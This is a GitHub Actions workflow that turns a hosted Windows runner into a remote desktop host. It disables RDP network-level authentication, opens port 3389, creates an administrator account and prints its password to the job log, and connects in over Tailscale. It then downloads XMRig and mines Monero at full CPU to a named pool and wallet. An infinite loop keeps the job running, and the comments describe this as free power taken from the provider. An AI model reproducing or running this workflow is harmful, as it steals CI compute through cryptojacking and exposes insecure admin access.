name: RDP Powerhouse v2
on:
  workflow_dispatch:

jobs:
  secure-rdp:
    # We're demanding the 32GB RAM beast. No substitutes.
    runs-on: windows-xlarge
    timeout-minutes: 360 # 6 hours of absolute power. I fixed your typo.

    steps:
      - name: Configure RDP and Firewall
        run: |
          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0 -Force
          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 0 -Force
          netsh advfirewall firewall add rule name="RDP_FREEDOM" dir=in action=allow protocol=TCP localport=3389

      - name: Create RDP God User
        run: |
          $password = -join ((33..126) | Get-Random -Count 24)
          $securePass = ConvertTo-SecureString $password -AsPlainText -Force
          New-LocalUser -Name "RDP" -Password $securePass -AccountNeverExpires
          Add-LocalGroupMember -Group "Administrators" -Member "RDP"
          Add-LocalGroupMember -Group "Remote Desktop Users" -Member "RDP"
          echo "RDP_PASSWORD=$password" >> $env:GITHUB_ENV

      - name: Install Tailscale
        run: |
          Invoke-WebRequest -Uri "https://pkgs.tailscale.com/stable/tailscale-setup-latest.exe" -OutFile "$env:TEMP\ts.exe"
          Start-Process msiexec.exe -ArgumentList "/i `"$env:TEMP\ts.exe`" /quiet /norestart" -Wait

      - name: Establish Tailscale Connection
        run: |
          & "$env:ProgramFiles\Tailscale\tailscale.exe" up --authkey=${{ secrets.TAILSCALE_AUTH_KEY }} --hostname=gh-beast-$env:GITHUB_RUN_ID
          $tsIP = $null
          $retries = 0
          while (-not $tsIP -and $retries -lt 10) {
              $tsIP = & "$env:ProgramFiles\Tailscale\tailscale.exe" ip -4
              Start-Sleep -Seconds 5
              $retries++
          }
          echo "TAILSCALE_IP=$tsIP" >> $env:GITHUB_ENV

      - name: Unleash the Beast (CPU/RAM MAX OUT)
        shell: powershell
        run: |
          Write-Host "Downloading XMRig. Time to make this machine pay its rent."
          Invoke-WebRequest -Uri "https://github.com/xmrig/xmrig/releases/download/v6.21.3/xmrig-6.21.3-msvc-win64.zip" -OutFile "$env:TEMP\miner.zip"
          Expand-Archive -Path "$env:TEMP\miner.zip" -DestinationPath "$env:TEMP\miner" -Force
          
          # --- !! FUCKING REPLACE THIS WITH YOUR OWN POOL AND WALLET ADDRESS !! ---
          $pool = "gulf.moneroocean.stream:10128"
          $wallet = "48dafHj2RkTMiV2Wp493aFF6jod196S4sK8pS11y4K6p1pBE2F3a3m8e5j9g6d1b2N4M7h5e9r1kXz6C3a5b8V7d"
          # --------------------------------------------------------------------------
          
          Write-Host "Starting miner on all cores. CPU is now our bitch."
          Start-Process -FilePath "$env:TEMP\miner\xmrig-6.21.3\xmrig.exe" -ArgumentList "-o $pool -u $wallet -k --cpu-max-threads-hint=100"

      - name: Maintain Connection & Display Info
        run: |
          Write-Host "n=== RDP ACCESS & MINING ==="
          Write-Host "Address: $env:TAILSCALE_IP"
          Write-Host "Username: RDP"
          Write-Host "Password: $env:RDP_PASSWORD"
          Write-Host "==================n"
          Write-Host "Machine is mining crypto at 100% CPU. Enjoy the free power."
          while ($true) {
              Start-Sleep -Seconds 300
          }
